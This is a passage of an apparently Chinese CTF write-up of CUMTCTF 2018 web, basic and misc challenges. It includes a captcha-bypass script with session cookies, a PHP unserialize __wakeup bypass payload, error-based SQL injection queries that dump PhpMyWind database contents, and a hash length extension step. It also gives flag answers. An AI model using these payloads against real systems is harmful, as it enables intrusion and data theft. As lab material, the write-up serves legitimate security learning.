href="#淘金" class="headerlink" title="淘金"></a>淘金</h2><p>这个题目的目标是抢金币达到1000即可通关，每次抢金币需要在三秒内输入验证码，成功即可抢到1金币，如果有毅力的话是可以手动抢的，或者写一个在线识别验证码的程序来自动抢也是可以的，但是这题还有更好的方案就是在我们提交验证码的环节，如果我们在请求中删去验证码字段即可成功抢到金币（也就是说验证码使可以绕过的），只是不确定这个是题目漏洞还是正解。代码如下，为了效率，同时抢多个人·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url_post = <span class="string">r'http://bxs.cumt.edu.cn/challenge/web/robber/dorob.php'</span></span><br><span class="line">url_get = <span class="string">r'http://bxs.cumt.edu.cn/challenge/web/robber/rob.php?id='</span></span><br><span class="line">cookies=&#123;<span class="string">"PHPSESSID"</span>:<span class="string">"2fle5nf7jrvi8lksme7uq0j1a3"</span>,<span class="string">"ssid"</span>:<span class="string">"a9598c3315159a39bbd981b8ec6fdb6d"</span>&#125;   </span><br><span class="line">s = requests.session()</span><br><span class="line">names = [<span class="string">"bxsrc"</span>,<span class="string">"333"</span>,<span class="string">"08163266"</span>,<span class="string">"EddieIvan"</span>]</span><br><span class="line">ids = [<span class="number">144</span>,<span class="number">125</span>,<span class="number">142</span>,<span class="number">109</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(names)):</span><br><span class="line">        data = <span class="string">"user="</span>+str(ids[i])+<span class="string">"&amp;num=1"</span></span><br><span class="line">        req1 = s.get(url=url_get+str(ids[i]),cookies=cookies)</span><br><span class="line">        print(url_get+str(ids[i]))</span><br><span class="line">        req2 = s.post(url=url_post,cookies=cookies,data=data)</span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><h2 id="听说你会面向对象"><a href="#听说你会面向对象" class="headerlink" title="听说你会面向对象"></a>听说你会面向对象</h2><p>题目给出了源代码，核心代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">'flag.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($f)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $f;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">        <span class="keyword">if</span> (stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'flag'</span>)+<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'dangerrous'</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        var_dump(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">        var_dump(file_exists(<span class="keyword">$this</span>-&gt;file));</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">        <span class="keyword">if</span> (!strpos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)&amp;&amp;!strpos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>))&#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'你想干嘛'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目需要绕过需要__wakeup()函数，百度发现该处存在一个CVE漏洞 <a href="https://blog.csdn.net/qq_19876131/article/details/52890854" target="_blank" rel="noopener">Click Here</a></p><p>我们写php代码序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">'flag.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> Admin();</span><br><span class="line"><span class="keyword">echo</span> serialize($obj);</span><br></pre></td></tr></table></figure><p>题目返回 <code>O:5:&quot;Admin&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code> ，我们只需要把Admin后面的1修改为2然后在url编码即可，最终payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A5%3A%22Admin%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br></pre></td></tr></table></figure><h2 id="phpmywind"><a href="#phpmywind" class="headerlink" title="phpmywind"></a>phpmywind</h2><p>首先得到flag非常简单，题目好像出bug了，访问首页直接就可以得到flag：）</p><p><img src="/2018/12/07/cumtctf/7.png" alt="payload"></p><p>但是题目好像修复了(事实上题目本身没有任何问题，之所以可看到flag是因为已经有大佬做出来了)，所以我们还是要来一波正解</p><p>题目给出来cms和版本，直接百度搜索漏洞，发现有个前台sql注入漏洞，需要先注册一个合法用户，我注册了一个用户为test_snow，密码123456，登录，然后在该网址下提交如下内容(因为该题目没有回显，所以使用了报错注入)</p><p><img src="/2018/12/07/cumtctf/11.png" alt=""></p><p>于是就可以看到数据库名，说明该报错方法可用，</p><p><img src="/2018/12/07/cumtctf/12.png" alt=""></p><p>但是该语句无法使用select语句，网上查找到了另一种报错注入的方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(char(@`%27`),(select schema_name from information_schema.schemata limit 1,1), 0x23,floor(rand(0)*2),char(@`%27`))x from information_schema.tables group by x</span><br></pre></td></tr></table></figure><p>可以利用这种方法报库名，发现这个库名为 <code>phpmyflag</code> ，虽然不是当前库，但是flag应该就是在这个库中</p><p>爆表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(char(@`%27`),(select table_name from information_schema.tables where table_schema=0x7068706d79666c6167 limit 0,1), 0x23,floor(rand(0)*2),char(@`%27`))x from information_schema.tables group by x</span><br></pre></td></tr></table></figure><p>本题中如果没有报错的话就会显示账号完善成功，这里只需要再次登录一下就可以了，由于题目转义过滤了单引号，所以使用了十六进制绕过</p><p>爆列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(char(@`%27`),(select column_name from information_schema.columns where table_name=0x666c6167 limit 0,1), 0x23,floor(rand(0)*2),char(@`%27`))x from information_schema.tables group by x</span><br></pre></td></tr></table></figure><p>读flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat(char(@`%27`),(select flag from phpmyflag.flag limit 0,1), 0x23,floor(rand(0)*2),char(@`%27`))x from information_schema.tables group by x</span><br></pre></td></tr></table></figure><p><img src="/2018/12/07/cumtctf/14.png" alt="result"></p><p>之前我以为flag在当前数据库中，走了不少弯路，看来还是自己思维太局限了</p><p><a href="https://www.0dayhack.com/post-764.html" target="_blank" rel="noopener">参考链接</a></p><!--flag{327A6C4304AD5938EAF0EFB6CC3E53DC}--><h1 id="BASIC"><a href="#BASIC" class="headerlink" title="BASIC"></a>BASIC</h1><h2 id="decode"><a href="#decode" class="headerlink" title="decode"></a>decode</h2><p>hex打开再base64解码即可</p><h2 id="白驹过隙"><a href="#白驹过隙" class="headerlink" title="白驹过隙"></a>白驹过隙</h2><p>访问题目出现</p><blockquote><p>You Have Missed the Flag ~&gt;.&lt;~</p></blockquote><p>开始猜测可能是某次返回的正确的flag，于是一连访问了1000次还是一无所获，后面想到它说 “You <strong>Missed</strong> flag”，所以思路应该是发生了302跳转，抓包也没有发现什么异常，没找到时哪儿发生了302跳转，后面一个偶然的机会，我们在原来题目链接出查看一下链接</p><p><img src="/2018/12/07/cumtctf/8.png" alt=""></p><p>再看题目页面的链接 <em>http://202.119.201.199/challenge/basic/http/defauIt.php </em> 仔细看一下，会发现两个 <code>default.php</code> 中题目给的链接中default倒数第二位是小写的L，而到了题目中变成了大写的 i ！！，如此的话跳转就清楚了，可以访问default.php(l为小写的L)</p><p><img src="/2018/12/07/cumtctf/9.png" alt=""></p><p>可以看到确实发生了302跳转，抓包</p><p><img src="/2018/12/07/cumtctf/10.png" alt=""></p><p>可以看到此处跳转到了defauIt.php(大写的i)，也可以看到我们读到了flag</p><p>或者你也可以直接挑战页面点击题目链接抓包，也可以读到flag，原理是一样的</p><!-- flag{U_a4e_A_Car3fu1_b0y} --><h2 id="齐白石"><a href="#齐白石" class="headerlink" title="齐白石"></a>齐白石</h2><p>16进制编辑器查看一下即可在字符串末尾看到flag</p><!-- flag{so_bor1ing_eMeMEMEMEM} --><h2 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h2><p>题目给出的是jsfuck代码，直接找在线网站运行一下借口得到flag</p><!-- flag{jj_3Nc0d3_i5_fun} --><h2 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h2><p>直接修改本地hosts文件解开，linux下修改/etc/hosts文件，添加一行数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">202.119.201.199 welcome.bxsteam.xyz</span><br></pre></td></tr></table></figure><p>然后访问welcome.bxsteam.xyz即可得到flag</p><!-- flag{H3110_w0rld} --><h2 id="签到1"><a href="#签到1" class="headerlink" title="签到1"></a>签到1</h2><p>邮件查看源代码，base64解码一下即可得到flag</p><!-- flag{this_is_so_easy_is_it?} --><h2 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h2><p>按照题目要去F12转到控制台在点击网络选项卡，选择重新载入，之后再消息头中的flag字段即可看到flag</p><!-- flag{Linux-Centos} --><h2 id="超简单的密码"><a href="#超简单的密码" class="headerlink" title="超简单的密码"></a>超简单的密码</h2><p>键盘加密，低头看下键盘即可，网上也有在线解密网站</p><!-- flag{isee} --><h2 id="滑稽"><a href="#滑稽" class="headerlink" title="滑稽"></a>滑稽</h2><p>ppt伪加密，打开后提示需要输入密码，网上找到一种方法可以绕过</p><blockquote><p>破解pptx只读需要密码<br>重命名qzxdh.pptx为qzxdh.zip，解压到<strong>当前文件夹</strong>后，切换到\ppt之下，用记事本开启presentation.xml文件；<br>把<p:modifyverifier ...="">整块选中并删除，保存并关闭；<br>将文件再打包成qzxdh.zip，更名为pptx即可。<br>本文来自 qzxdh 的CSDN 博客 ，全文地址请点击：<a href="https://blog.csdn.net/qzxdh/article/details/72624298?utm_source=copy" target="_blank" rel="noopener">https://blog.csdn.net/qzxdh/article/details/72624298?utm_source=copy</a> </p:modifyverifier></p></blockquote><p>按照该方法即可打开PPT，之后拖动首页幻灯片后即可发现后面还藏着一张幻灯片，里面就有flag</p><!-- flag{hua_tian_xia_zhi_da_ji} --><h2 id="Fast-30"><a href="#Fast-30" class="headerlink" title="Fast 30"></a>Fast 30</h2><p>一道很常规的题目，就是不断把题目返回的信息在两秒之内发回去，这肯定不能人工操作，需要编程，本题需要提交的内容是header头里面的Flag字段的值，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://web.bxsteam.xyz/fast/"</span></span><br><span class="line">header = requests.get(url).headers[<span class="string">"Flag"</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">header = requests.post(url,data=&#123;<span class="string">"key"</span>:header&#125;).headers[<span class="string">'Flag'</span>]</span><br><span class="line">ans = requests.post(url,data=&#123;<span class="string">"key"</span>:header&#125;).text</span><br><span class="line"><span class="keyword">if</span> <span class="string">'&#123;'</span> <span class="keyword">in</span> ans:</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><!-- cumtctf{time_1s_a_Resource} --><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>题目给出了提示，lsb色道隐写，丢进steg里面看一下，发现rgb的每个0通道里面，图片上方都有会多出一个黑块，说明和这三个色道有关系</p><p><img src="/2018/12/07/cumtctf/19.png" alt=""></p><p>提取一下这三个色道的信息，发现时png文件头</p><p><img src="/2018/12/07/cumtctf/20.png" alt=""></p><p>提取保存为png图片是个二维码，直接扫码就可以看到flag</p><!-- cumtctf{1sb_i4_s0_Ea4y} --><h2 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h2><p>右键查看图片属性，发现在备注里面有一串字符 <code>this_is_not_password</code>，感觉这应该是压缩包密码，猜测图片中应该隐含了一个压缩包，hed软件打开图片，直接搜索 <code>504b0304</code> (zip文件头)，果然找到了，而且在右边的字符串中还看到了flag.txt字样，直接将这段提取出来，改后缀为zip，解压，提示需要密码，输入前面的字符串 <code>this_is_not_password</code> ，解压即可得到flag</p><!-- flag{dd22a92bf2cceb6c0cd0d6b83ff51606} --><h2 id="视而不见"><a href="#视而不见" class="headerlink" title="视而不见"></a>视而不见</h2><p>看了好久没思路，网上发现bmp图像的题目基本都是色道隐写的问题，于是就用stegsolve软件疯狂尝试，analyse-&gt;steteogram-&gt;solver里面修改偏移值找到了flag(233333)</p><p><img src="/2018/12/07/cumtctf/21.png" alt="result"></p><h2 id="鲨鱼的套路"><a href="#鲨鱼的套路" class="headerlink" title="鲨鱼的套路"></a>鲨鱼的套路</h2><p>打开数据包，追踪tcp流，发现如下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">hello</span><br><span class="line">hehe</span><br><span class="line">i will give you flag~</span><br><span class="line">o</span><br><span class="line">but you must tell me te.he anhhao...ao~</span><br><span class="line">woyaohuinongcun</span><br><span class="line">ok i will give you flag~</span><br><span class="line">just revice .......g.receive it</span><br><span class="line">UEsDBBQAAAgIANeFfErNFL6kGwAAABsAAAAcAAAAaGludF9zb21lIF90aGluZ19pc19mYWtlLnR4dEvLSUyvTs5IzUuPL87IjC9JzI/PKQUyU/NqAVBLAQI/ABQACQAIANeFfErNFL6kGwAAABsAAAAcACQAAAAAAAAAIAAAAAAAAABoaW50X3NvbWUgX3RoaW5nX2lzX2Zha2UudHh0CgAgAAAAAAABABgAu7Ux1J+n0gGhDeAnl6fSAaEN4CeXp9IBUEsFBgAAAAABAAEAbgAAAFUAAAAAAA==</span><br><span class="line">~</span><br><span class="line">bye~</span><br><span class="line">o</span><br></pre></td></tr></table></figure><p>这段应该是base64，但是在线网站无法解码，自己尝试，发现是个压缩包，保存为zip格式</p><p><img src="/2018/12/07/cumtctf/22.png" alt=""></p><p>之后是zip伪加密</p><p><img src="/2018/12/07/cumtctf/23.png" alt=""></p><!-- flag{cheng_shi_tao_lu_shen} --><h2 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy crypto"></a>easy crypto</h2><p>解压之后有个morse.txt，一看就是摩斯密码，解码为 <code>keyisvigenerecipher</code> ，提到了维吉尼亚密码，直接解密flag.txt，key就是 <code>vigenerecipher</code> ，然后解码即可得到flag</p><!-- flag{vigenereencryptionhhh} --><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><p>题目给出了代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">char getCode(char orgin) &#123;</span><br><span class="line">    return ( key1 * (orgin-97) + key2 ) % 26 + 97;</span><br><span class="line">&#125;</span><br><span class="line">code : joqtgyvlmcqivvvvmmmmzzzzcccciiiijjjjoooossssqqqqmmmm</span><br></pre></td></tr></table></figure><p>注意题目的路径其实给出了提示 <code>challenge/misc/fangshe/</code> ，最后的 <em>fangshe</em> 其实就是仿射的意思，意思是本题是一道放射密码的题目，就是位置为key1和key2的仿射加密，网上说了key1，key2的范围是小于26的，我们数论刚开始学，我也不是很理解，我个人感觉应该是由于题目的函数如果把key1和key2看做x和y的话，key1 * (orgin-97) + key2就是一条直线，那么key值大于26之后模26是会和前面重复的，这个以后学了得在研究一下，但是这题我们可尝试暴力破解，需要注意的是我之前以为题目给的code是密文，但事实上人家给的是明文，密文是flag …….</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">"joqtgyvlmcqivvvvmmmmzzzzcccciiiijjjjoooossssqqqqmmmm"</span></span><br><span class="line">ans = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> key1 <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">  <span class="keyword">for</span> key2 <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">    ans = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> cipher:</span><br><span class="line">      ans += chr((key1 * (ord(char)<span class="number">-97</span>) + key2) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> ans <span class="keyword">or</span> <span class="string">"ctf"</span> <span class="keyword">in</span> ans:</span><br><span class="line">      print(ans)</span><br></pre></td></tr></table></figure><p>跑完之后发现其中一个结果是</p><blockquote><p>heiboyflagisffffaaaannnnggggsssshhhheeeemmmmiiiiaaaa</p></blockquote><p>断句一下为</p><blockquote><p>hei boy,flag is ffffaaaannnnggggsssshhhheeeemmmmiiiiaaaa</p></blockquote><!-- flag{ffffaaaannnnggggsssshhhheeeemmmmiiiiaaaa} --><h2 id="PS-Master"><a href="#PS-Master" class="headerlink" title="PS Master"></a>PS Master</h2><p>题目提示的很明显了，和ps有关，那基本就是图层的问题了，但是题目的文件用PS无法打开，binwalk一下发现是个gif图片，修改文件后缀为gif，发现可以用PS打开，打开之后第二个图层是个二维码，但是无法扫描，因为定位块上都有个二哈</p><p><img src="/2018/12/07/cumtctf/35.png" alt="PS提取结果"></p><p>参照标准二维码可以知道，左上，右上，左下都应该是黑色的定位块，可以用win10自带的画图工具把右上的块复制到左上和左下，然后把二哈图案用黑色填充，处理之后如下，扫码可得flag</p><p><img src="/2018/12/07/cumtctf/36.png" alt="result"></p><!-- flag{hi_doge_i_am_er_ha} --><h2 id="传感器1"><a href="#传感器1" class="headerlink" title="传感器1"></a>传感器1</h2><p>题目提示了是第九届全国大学生信息安全竞赛，可以知道这个题目考察的是曼彻斯特编码，先将题目的16进制转为2进制，根据曼彻斯特编码规则，由低到高即01代表1，由高到低即10代表0，之后转化为16进制之后发现与题目ID不符，还需要每八位进行一下反转，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Manchester</span><span class="params">(s)</span>:</span></span><br><span class="line">    ans = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)//<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> s[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>] == <span class="string">'01'</span>:</span><br><span class="line">            ans += <span class="string">'1'</span>;</span><br><span class="line">        <span class="keyword">elif</span> s[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>] == <span class="string">'10'</span>:</span><br><span class="line">            ans += <span class="string">'0'</span>;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"error in"</span>,i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">s = <span class="string">"010101010101010101010101010101011001010101010101010110100110010101010101011010101010011010010110101010100110011001100110011001100110100101010101"</span></span><br><span class="line">p = Manchester(s)</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(p)//<span class="number">8</span>):</span><br><span class="line">    flag += p[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>][::<span class="number">-1</span>]</span><br><span class="line">print(hex(int(flag,<span class="number">2</span>)))</span><br></pre></td></tr></table></figure><!-- flag{FFFFFED31F645055F9} --><h2 id="我就想试试这个名字到底能够起多长"><a href="#我就想试试这个名字到底能够起多长" class="headerlink" title="我就想试试这个名字到底能够起多长"></a>我就想试试这个名字到底能够起多长</h2><p>下载之后丢进stegsolve里面看一下，看一下低色道，发现是504b0304(zip文件头)</p><p><img src="/2018/12/07/cumtctf/18.png" alt="data extract"></p><p>保存为zip格式，但是解压不了，WinRAR修复一下就可以解压了，将解压后的文件拖进hex里面看一下直接就看到了flag。</p><!-- hctf{dd0gf4c3tok3yb0ard4g41n~~~} --><h2 id="你的石锅拌饭"><a href="#你的石锅拌饭" class="headerlink" title="你的石锅拌饭"></a>你的石锅拌饭</h2><p>题目给出了提示信息，<strong><em>培根</em></strong>，可知是培根加密，而且题目字体用了两种字体，就更加确定了，网上查资料发现培根密码有两种加密方式</p><blockquote><p> 第一种方式：<br>    A aaaaa B aaaab C aaaba D aaabb E aabaa<br>    F aabab G aabba H aabbb I abaaa J abaab<br>    K ababa L ababb M abbaa N abbab O abbba<br>    P abbbb Q baaaa R baaab S baaba T baabb<br>    U babaa V babab W babba X babbb Y bbaaa<br>    Z bbaab</p><p>   第二种方式<br>    a AAAAA   g AABBA    n ABBAA   t BAABA<br>    b AAAAB   h AABBB    o ABBAB   u-v BAABB<br>    c AAABA   i-j ABAAA  p ABBBA   w BABAA<br>    d AAABB   k ABAAB    q ABBBB   x BABAB<br>    e AABAA   l ABABA    r BAAAA   y BABBA<br>    f AABAB   m ABABB    s BAAAB   z BABBB</p></blockquote><p>而本题目中说了要大写，所以使用的是第一种加密方式，把题目中正常字体写成A，斜体写成B，转换之后如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ABAAAABABBABBBABABABAABAABAABAAABBAAAAABAABAB</span><br></pre></td></tr></table></figure><p>对照解密即可，也可以在在线网站解密</p><h2 id="shark"><a href="#shark" class="headerlink" title="shark"></a>shark</h2><p>题目提示了用wireshark，是一道流量分析题目，打开之后随便浏览发现了ftp登录的信息</p><p><img src="/2018/12/07/cumtctf/24.png" alt="登录认证报文"></p><p>感觉题目应该是和ftp有关，过滤一下ftp协议</p><p><img src="/2018/12/07/cumtctf/25.png" alt=""></p><p>这就基本确定了本题就是获取这个flag.zip，直接 <code>tcp contains &quot;flag&quot;</code> ，可以看到FTP-DATA协议中传输了flag.zip的数据</p><p><img src="/2018/12/07/cumtctf/26.png" alt=""></p><p>追踪tcp流，然后可以看到文件头为504b0304，可以确定这就是我们要的flag.zip文件，但是不能直接保存，这样是打不开的，要按照原始数据保存</p><p><img src="/2018/12/07/cumtctf/27.png" alt="save as为flag.zip"></p><p>文件被加密了(不是伪加密)，需要密码，尝试前面登录ftp服务器的密码试一下，直接OK</p><p>解压后的图片没有显示格式，丢进16进制编辑器里面看一下，是个png图片，但是文件头不对，修复一下</p><p><img src="/2018/12/07/cumtctf/28.png" alt=""></p><p>然后保存为png图片打开就OK了</p><p><img src="/2018/12/07/cumtctf/29.png" alt="We are family!"></p><!-- flag{this_PIcTur3_1s_SO_ugly_} --><h2 id="学姐真美"><a href="#学姐真美" class="headerlink" title="学姐真美"></a>学姐真美</h2><p>下载之后是一张jpg图片，发现在图片尾部之后还有东西，感觉像是png图片相关的东西，因为有IHDR块，然后在下载一张png图片对着格式修复，本图只需要修复八位即可</p><p><img src="/2018/12/07/cumtctf/16.png" alt="repair"></p><p>是一张二维码，但是只有一小部分，尝试修改图片尺寸，下图中前四个字节是宽度，后四个字节是高度，直接按我的修改为正方形即可</p><p><img src="/2018/12/07/cumtctf/17.png" alt="repair"></p><!-- flag{ChaoRan_is_beautiful!!!} --><h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h2><p>哈希长度扩展攻击，和web里面的 <em>is hash safe?</em> 相同类型，所以原理就不多说了，直接上工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# hashpump</span><br><span class="line">Input Signature: 4dbe35eaea655b0a2b0d06391175b8a3</span><br><span class="line">Input Data: r</span><br><span class="line">Input Key Length: 18</span><br><span class="line">Input Data to Add: snow</span><br></pre></td></tr></table></figure><p>得到结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">65710003c2ff40389b064d3a020487bd</span><br><span class="line">r\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x98\x00\x00\x00\x00\x00\x00\x00snow</span><br></pre></td></tr></table></figure><p>第一行md5提交，第二行在前面加上 <strong>cy</strong> 在将 <code>\x</code> 换成空格，字母换成16进制表示即可，最终为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">63 79 72 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 98 00 00 00 00 00 00 00 73 6E 6F 77</span><br></pre></td></tr></table></figure><p>提交即可得到flag</p><h2 id="大家来找茬"><a href="#大家来找茬" class="headerlink" title="大家来找茬"></a>大家来找茬</h2><p>既然说了大家来找茬，感觉图片肯定有问题，估计是两张，binwalk一下发现果然是两个，foremost分离一下，本来以为是盲水印但是发现不是，百度发现了一个compare命令，试了一下居然得到个二维码，扫码得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compare 00000000.png 00000668.png 3.png</span><br></pre></td></tr></table></figure><p><img src="/2018/12/07/cumtctf/32.png" alt=""></p><h2 id="据说是个签到题"><a href="#据说是个签到题" class="headerlink" title="据说是个签到题"></a>据说是个签到题</h2><p>流量分析，打开之后先过滤一下http包，只有两个http，发现其中一个请求为 <code>GET /evaltest/something/welcome/web/upload_function/upload/c2hlbGw=.php HTTP/1.1\r\n</code> ，感觉应该上传了什么东西，于是过滤tcp包 <code>tcp contains &quot;upload&quot;</code> 发现了数据传输，从第二个开始追踪tcp流</p><p><img src="/2018/12/07/cumtctf/15.png" alt=""></p><p>发现了flag，但是经过了function.py的加密，不过题目也给出了代码，所以直接用它的代码解密一下即可，但是要把密文base64解密一下，代码如下</p><figure class="highlight python"><table><tr><td 